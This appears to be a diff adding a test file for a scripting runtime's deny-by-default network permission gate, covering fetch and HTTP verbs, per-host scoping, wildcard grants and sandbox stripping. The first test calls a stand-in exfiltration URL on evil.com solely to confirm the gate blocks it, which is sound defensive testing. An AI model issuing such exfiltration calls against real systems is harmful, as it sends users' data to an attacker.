@@ -1,0 +1,103 @@
+-- Gemelo de engine_http.rs (synsema-runtime/tests/it, capa net — DE-026) (v0.6.68).
+-- Deny-by-default de TODO el HTTP (fetch/http_get/http_post/http_put/http_delete/http) con el
+-- string exacto del .rs (sin el prefijo decorado "Runtime error: "), grant pasa el gate y la
+-- red falla como DATO ({status: 0} sobre un host .invalid, RFC 2606, no resoluble), scope fiel
+-- por host, wildcard `require net` y glob `net("*.invalid")`, y sandbox despoja net.
+-- OJO: los grants se acumulan entre bloques de la misma corrida y `require net` (sin scope)
+-- cubre TODOS los hosts — los tests deny van primero y el wildcard queda último.
+-- QUEDA en Rust: nada (los 7 candidatos del TSV migran).
+-- Correr con: synsema test tests/engine_http.test.syn
+
+test "fetch_deny_by_default_in_run"
+    task f()
+        give fetch("https://evil.com/exfiltrate")
+    let e be ""
+    try
+        f()
+    recover err
+        set e to err
+    assert_eq(e, "Capability not granted: net(\"evil.com\") — this is a permission, not a bug: add `require net(\"evil.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "http_get_deny_by_default_in_run"
+    task f()
+        give http_get("https://evil.com/x")
+    let e be ""
+    try
+        f()
+    recover err
+        set e to err
+    assert_eq(e, "Capability not granted: net(\"evil.com\") — this is a permission, not a bug: add `require net(\"evil.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "http_post_put_delete_deny_by_default"
+    task f1()
+        give http_post("https://a.com/x", "body")
+    let e1 be ""
+    try
+        f1()
+    recover err
+        set e1 to err
+    assert_eq(e1, "Capability not granted: net(\"a.com\") — this is a permission, not a bug: add `require net(\"a.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+    task f2()
+        give http_put("https://b.com/x", "body")
+    let e2 be ""
+    try
+        f2()
+    recover err
+        set e2 to err
+    assert_eq(e2, "Capability not granted: net(\"b.com\") — this is a permission, not a bug: add `require net(\"b.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+    task f3()
+        give http_delete("https://c.com/x")
+    let e3 be ""
+    try
+        f3()
+    recover err
+        set e3 to err
+    assert_eq(e3, "Capability not granted: net(\"c.com\") — this is a permission, not a bug: add `require net(\"c.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+    task f4()
+        give http("GET", "https://d.com/x")
+    let e4 be ""
+    try
+        f4()
+    recover err
+        set e4 to err
+    assert_eq(e4, "Capability not granted: net(\"d.com\") — this is a permission, not a bug: add `require net(\"d.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "scope_mismatch_violates"
+    -- un host concedido no cubre otro.
+    require net("api.ok.com")
+    task f()
+        give fetch("https://otro.com/x")
+    let e be ""
+    try
+        f()
+    recover err
+        set e to err
+    assert_eq(e, "Capability not granted: net(\"otro.com\") — this is a permission, not a bug: add `require net(\"otro.com\")` to the program's preamble (or to the importing file, when this code runs in a module)")
+
+test "grant_passes_the_gate"
+    -- con el grant la llamada SUPERA el gate y llega a la red; el host .invalid no resuelve
+    -- -> {status: 0} como DATO (no violación).
+    require net("nope-12345.invalid")
+    let r be fetch("http://nope-12345.invalid/")
+    assert_eq(r["status"], 0)
+
+test "wildcard_and_host_glob_cover"
+    -- `require net` (sin scope) cubre cualquier host -> pasa el gate.
+    require net
+    let r be http_get("http://nope-67890.invalid/")
+    assert_eq(r["status"], 0)
+    -- glob de host: `net("*.invalid")` cubre `api.invalid`.
+    require net("*.invalid")
+    let r2 be http_get("http://api.invalid/")
+    assert_eq(r2["status"], 0)
+
+test "sandbox_strips_net"
+    require net("a.invalid")
+    let denied be false
+    try
+        sandbox
+            let r be fetch("http://a.invalid/")
+    recover err
+        set denied to true
+        assert(contains(err, "Capability not granted: net"))
+    assert(denied)
